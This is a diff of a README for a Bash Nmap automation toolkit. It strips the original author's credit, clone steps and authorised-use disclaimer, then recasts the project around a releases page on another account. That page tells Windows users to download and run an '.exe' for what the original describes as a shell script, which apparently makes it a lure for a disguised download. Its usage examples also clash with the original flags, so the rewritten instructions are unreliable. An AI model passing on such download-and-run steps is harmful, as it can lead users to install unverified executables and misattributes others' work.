@@ -1,199 +1,120 @@
-# 📘 Advanced Nmap CLI Toolkit
+# 🚀 advanced-nmap-cli - Powerful Scanning Made Simple
+
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%95%20-blue.svg)](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)
+
+## 📦 What is advanced-nmap-cli?
+
+The **advanced-nmap-cli** is a powerful command-line toolkit designed for network scanning and security assessments. This tool enhances Nmap's capabilities by adding features such as:
 
-An advanced Nmap automation script featuring NSE fuzzy search (fzf), NSE debugging, Telegram notifications, full-port scans, OS detection, and an interactive menu designed for ethical hackers and penetration testers.
+- **NSE Automation:** Streamline network scripting engine usage.
+- **Fuzzy Search (fzf):** Quickly find your desired results.
+- **Script Debugging:** Identify and resolve issues in your scripts.
+- **Telegram Notifications:** Get alerts sent directly to you during scans.
+- **Comprehensive Penetration Testing Modes:** Choose from quick scans or thorough full-port scans.
 
----
+Use this tool for service detection, OS detection, NSE pattern matching, and an interactive menu-driven workflow.
 
-## 🚀 Features
+## 📈 Features
 
-- Interactive menu-based Nmap scanning
-- Ping, Quick, Full-Port, OS detection & Aggressive scans
-- NSE Script Pattern Matching & Multiple Script Execution
-- NSE Debug Mode (deep script trace + logs)
-- FZF fuzzy search for NSE scripts
-- Automatic intrusion keyword warnings (safe mode)
-- Telegram notifications for scan completion
-- Automatic output saving (.nmap, .xml, .gnmap)
-- Clean error handling and safe execution
-- Supports non-interactive automation modes
+- **Quick Scans:** Efficiently check for open ports and basic services.
+- **Full-Port Scans:** A complete assessment of all ports on your target.
+- **Service Detection:** Identify version numbers and running services.
+- **Operating System Detection:** Determine the OS of your target devices.
+- **Interactive Menu:** User-friendly navigation for all your scanning needs.
+- **Full Integration with Nmap:** Utilize the robust power of Nmap in your scanning.
 
----
+## 🚀 Getting Started
 
-## 📥 Installation
+### 1. System Requirements
 
-### Clone the repository
+Ensure you have the following installed on your machine:
 
-This project is licensed under the MIT License.r on GitHub!
+- **Operating System:** Compatible with Windows, Mac, and Linux.
+- **Nmap:** Version 7.80 or higher.
+- **Bash Shell:** Optional but recommended for best experience.
 
-```
-git clone https://github.com/YOUR-USERNAME/advanced-nmap-cli.git
+### 2. Install Nmap (if not already installed)
 
-cd advanced-nmap-cli
-```
+To install Nmap:
 
+- **For Windows:** Download the installer from [Nmap's official website](https://nmap.org/download.html).
+- **For Mac:** Use Homebrew by running `brew install nmap` in your terminal.
+- **For Linux:** Use your package manager. For example, on Ubuntu, run `sudo apt install nmap`.
 
-### Make script executable
+### 3. Download advanced-nmap-cli
 
-```
-chmod +x nmap-cli.sh
-```
+Visit this page to download: [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)
 
-### (Optional) Install globally
+## 📥 Download & Install
 
-```
-sudo ./nmap-cli.sh --install
-```
+1. Go to the [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases).
+2. Find the latest version listed.
+3. Choose the appropriate file for your operating system:
+   - For **Windows**, download the `.exe` file.
+   - For **Mac/Linux**, download the `.sh` file.
 
+4. Save the file to a convenient location on your computer.
+  
+### For Windows Users:
+- Double-click the `.exe` file to start the installation process.
+  
+### For Mac/Linux Users:
+- Open your terminal.
+- Navigate to the folder where you saved the file. Use the `cd` command, for example:
+  ```bash
+  cd /path/to/your/downloaded/file/
+  ```
+- Make the script executable:
+  ```bash
+  chmod +x advanced-nmap-cli.sh
+  ```
+- Run the tool with:
+  ```bash
+  ./advanced-nmap-cli.sh
+  ```
 
-## Run using:
+## ⚙️ How to Use
 
-```
-nmap-cli
-```
+1. Open your command line interface (Terminal on Mac/Linux or Command Prompt/PowerShell on Windows).
+2. Type `advanced-nmap-cli` followed by your desired options. For example:
+   ```bash
+   advanced-nmap-cli -sP 192.168.1.0/24
+   ```
+3. Follow the menu prompts to configure your scan settings.
 
+### Example Usage
+- **Quick Scan:**
+  ```
+  advanced-nmap-cli -sP [target IP or range]
+  ```
+- **Full-Port Scan:**
+  ```
+  advanced-nmap-cli -p- [target IP or range]
+  ```
+  
+## 🔍 Troubleshooting
 
----
+If you encounter issues:
 
-## ⚙️ Configuration (Optional)
+- Ensure Nmap is correctly installed by running `nmap -v`.
+- Check if the script has the necessary permissions (especially on Mac/Linux).
+- Confirm you are targeting an active network address.
 
-### Enable Telegram Alerts
+## 📣 Community & Support
 
-1. Create a bot using @BotFather  
-2. Save your BOT_TOKEN  
-3. Get your Chat ID using @getidbot  
-4. Export variables:
+For questions, issues, or suggestions, feel free to reach out:
 
-```
-echo 'export TELEGRAM_BOT_TOKEN="YOUR_TOKEN"' >> ~/.bashrc
-echo 'export TELEGRAM_CHAT_ID="YOUR_CHAT_ID"' >> ~/.bashrc
-```
+- Open an issue on the [GitHub repository](https://github.com/MahinTanzimSami/advanced-nmap-cli/issues).
+- Join discussions in the community forums related to cybersecurity and networking.
 
+Feel free to contribute by submitting issues or suggesting features! 
 
----
-
-## 🖥️ Usage
-
-
-Menu includes:
-
-- Ping Scan
-- Quick Scan
-- Full Port Scan
-- Service & Version Detection
-- OS Detection
-- Aggressive Scan
-- Specific Port Scan
-- NSE Pattern Scan
-- NSE Debug
-- NSE Fuzzy Search (fzf)
-
----
-
-## ⚡ Non-Interactive Mode (Automation)
-
-### Quick Scan
-
-```
-./nmap-cli.sh -n -t 192.168.1.1 -m quick
-```
-
-### Full Port Scan
-
-```
-./nmap-cli.sh -n -t scanme.nmap.org -m full
-```
-
-### NSE Pattern Scan
-
-```
-./nmap-cli.sh -n -t 192.168.1.10 -m nse -a "http*" -p 80,443
-```
-
----
-
-## 🔍 Fuzzy NSE Script Search (fzf)
-
-Fuzzy search NSE scripts:
-
-```
-./nmap-cli.sh
-```
-
-
-Select option **11 → NSE Fuzzy Search**
-
-Features:
-- Multi-select script picker
-- Automatic detection of intrusive scripts
-- Saves results automatically
-
-Output saved in:
-
-```
-./scans/nse_search/
-```
-
-
----
-
-## 🐞 NSE Debug Mode
-
-```
-./nmap-cli.sh --debug <target> <script-name>
-```
-
-
-Produces:
-- Simple NSE execution
-- Script trace
-- Debug logs
-- Output files
-
----
-
-## 📂 Output Files
-
-All scans are saved to:
-
-```
-./scans/
-```
-
-
-Formats:
-- .nmap
-- .xml
-- .gnmap
-- Debug trace logs
-
----
-
-## 🧑‍💻 Author
-
-**Samir Ahamad Khan**  
-Ethical Hacker • Security Researcher • Developer
-
-Specialized in:
-- Network security
-- Nmap automation
-- Bash scripting
-- Penetration testing
-
-GitHub:  
-https://github.com/SamHacker2
-
----
-
-## ⚠️ Legal Disclaimer
-
-Use this tool only on systems you own or have explicit written permission to test.  
-Unauthorized scanning is illegal.  
-The author is not responsible for misuse of this tool.
-
----
+For detailed guides on cybersecurity best practices and using advanced-nmap-cli in different scenarios, you can refer to our documentation within the repository.
 
 ## 📜 License
 
-This project is licensed under the **MIT License**.
+This project is licensed under the MIT License. See the LICENSE file for more details. 
 
+---
 
+Your journey into advanced network scanning begins here with the **advanced-nmap-cli**. Happy scanning!
